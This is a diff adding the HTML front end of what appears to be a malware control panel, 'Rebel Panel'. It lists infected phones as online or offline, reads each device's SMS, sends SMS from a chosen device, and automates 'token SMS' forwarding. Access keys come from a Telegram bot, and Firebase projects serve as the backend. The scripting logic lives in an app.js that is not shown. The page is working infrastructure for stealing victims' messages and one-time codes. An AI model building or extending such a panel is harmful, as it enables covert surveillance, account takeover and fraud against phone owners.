@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no"/>
+<meta name="theme-color" content="#050508"/>
+<title>Rebel Panel</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+<link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+<div class="bg-anim" aria-hidden="true">
+  <canvas id="particleCanvas" class="particle-canvas"></canvas>
+  <span class="orb orb-1"></span><span class="orb orb-2"></span><span class="orb orb-3"></span>
+  <span class="grid-lines"></span>
+  <span class="aurora"></span>
+</div>
+<div class="fx-layer" id="fxLayer"></div>
+<div class="boot-splash" id="bootSplash">
+  <div class="boot-hex"></div>
+  <div class="boot-logo"><span class="boot-ring"></span><span class="boot-ring r2"></span><img src="avatar.jpg" alt="" onerror="this.style.display='none'"/></div>
+  <div class="boot-title glitch" data-text="Rebel Panel"><em>Rebel</em> Panel</div>
+  <div class="boot-bar"><span class="boot-bar-fill"></span></div>
+  <div class="boot-scan"></div>
+</div>
+
+<!-- LOGIN -->
+<div class="login-screen" id="loginScreen">
+  <div class="login-card anim-in" id="loginCard">
+    <div class="card-shine"></div>
+    <div class="login-hero">
+      <div class="avatar-stage" id="rebelAvatarStage" data-avatar-ver="7">
+        <div class="avatar-face-ring">
+          <div class="avatar-img-wrap">
+            <img class="avatar-face" id="avatarFaceImg" src="avatar.jpg" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
+          </div>
+        </div>
+        <div class="avatar-laptop">
+          <div class="laptop-glow"></div>
+          <div class="laptop-lid">
+            <div class="laptop-screen">
+              <div class="laptop-code" id="laptopCode">
+                <span class="laptop-line l1"><span class="dim">$</span> firebase.init()</span>
+                <span class="laptop-line l2"><span class="hi">send</span>Sms(<span class="dim">to</span>, msg)</span>
+                <span class="laptop-line l3"><span class="dim">$</span> rebel.unlock()<span class="laptop-cursor"></span></span>
+              </div>
+            </div>
+          </div>
+          <div class="laptop-base"></div>
+        </div>
+      </div>
+      <h1 class="glitch-sm" data-text="Rebel Mobile"><em>Rebel</em> Mobile</h1>
+    </div>
+    <p class="login-sub">Key from Telegram — @Rebelpanelbot → /genkey</p>
+    <div class="login-err" id="loginErr"></div>
+    <input class="key-input" id="loginKey" placeholder="RBL-XXXXXX-XXXXXX" autocomplete="off" maxlength="32"/>
+    <label class="remember"><input type="checkbox" id="rememberMe" checked/> Remember this phone</label>
+    <button class="btn-primary" id="loginBtn" onclick="doLogin()"><span class="btn-label">Unlock Panel</span></button>
+  </div>
+</div>
+
+<!-- APP -->
+<div class="app hidden" id="appShell">
+  <header class="hdr">
+    <div class="hdr-left">
+      <div class="rebel-avatar-sm">
+        <img src="avatar.jpg" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
+      </div>
+      <div>
+        <div class="hdr-title">Rebel Mobile <span class="live-dot" id="hdrLive"></span></div>
+        <div class="hdr-sub" id="hdrSub">Connecting...</div>
+      </div>
+    </div>
+    <div class="hdr-actions">
+      <button class="fb-chip" id="fbChip" onclick="openFbSheet()">Firebase ▾</button>
+      <button class="icon-btn" id="refreshBtn" onclick="refreshData()" title="Refresh">↻</button>
+    </div>
+  </header>
+
+  <div class="screens" id="screensWrap">
+    <section class="screen active" id="screen-home">
+      <div class="stats-row">
+        <div class="stat-card"><div class="stat-val" id="stTotal">0</div><div class="stat-lbl">DEVICES</div></div>
+        <div class="stat-card"><div class="stat-val on" id="stOnline">0</div><div class="stat-lbl">ONLINE</div></div>
+        <div class="stat-card"><div class="stat-val off" id="stOffline">0</div><div class="stat-lbl">OFFLINE</div></div>
+      </div>
+      <div class="search-wrap"><input class="search" id="devSearch" placeholder="Search phone or device..." oninput="renderDevices()"/></div>
+      <div id="devList"></div>
+    </section>
+
+    <section class="screen" id="screen-device">
+      <div id="deviceEmpty" class="empty-state"><div class="ico">📱</div>Select a device from Home</div>
+      <div id="deviceHero" class="hidden"></div>
+    </section>
+
+    <section class="screen" id="screen-sms">
+      <div id="smsEmpty" class="empty-state"><div class="ico">💬</div>Select a device to view SMS</div>
+      <div class="sms-list" id="smsList"></div>
+    </section>
+
+    <section class="screen" id="screen-send">
+      <div id="sendEmpty" class="empty-state"><div class="ico">📤</div>Select a device to send SMS</div>
+      <div class="form-card hidden" id="sendForm">
+        <label class="form-label">To Number</label>
+        <input class="form-input" id="sendTo" type="tel" placeholder="9876543210"/>
+        <label class="form-label">Message</label>
+        <textarea class="form-textarea" id="sendMsg" placeholder="Type message..."></textarea>
+        <button class="btn-send" onclick="sendSms()">Send SMS</button>
+        <div class="send-status" id="sendStatus"></div>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-more">
+      <span class="proto-tag">📱 MOBILE PROTOTYPE</span>
+      <div class="menu-list">
+        <div class="menu-item" onclick="openFbSheet()">Firebase Project <span id="moreFbName">—</span></div>
+        <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
+        <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
+        <a class="menu-item" href="#" onclick="toast('Built-in APK panel',true);return false;" style="text-decoration:none;color:inherit">Desktop Panel <span>sex.php →</span></a>
+        <div class="menu-item danger" onclick="doLogout()">Logout</div>
+      </div>
+    </section>
+  </div>
+
+  <nav class="bottom-nav" id="bottomNav">
+    <button class="nav-item active" data-tab="home" onclick="switchTab('home',this)"><span class="ico">🏠</span>Home</button>
+    <button class="nav-item" data-tab="device" onclick="switchTab('device',this)"><span class="ico">📱</span>Device</button>
+    <button class="nav-item" data-tab="sms" onclick="switchTab('sms',this)"><span class="ico">💬</span>SMS</button>
+    <button class="nav-item" data-tab="send" onclick="switchTab('send',this)"><span class="ico">📤</span>Send</button>
+    <button class="nav-item" data-tab="more" onclick="switchTab('more',this)"><span class="ico">⚙️</span>More</button>
+  </nav>
+</div>
+
+<div class="sheet-bg" id="sheetBg" onclick="closeFbSheet()"></div>
+<div class="sheet" id="fbSheet">
+  <div class="sheet-handle"></div>
+  <div class="sheet-title">Switch Firebase</div>
+  <div id="fbSheetList"></div>
+</div>
+<div class="toast-wrap" id="toasts"></div>
+
+<script src="app.js"></script>
+</body>
+</html>
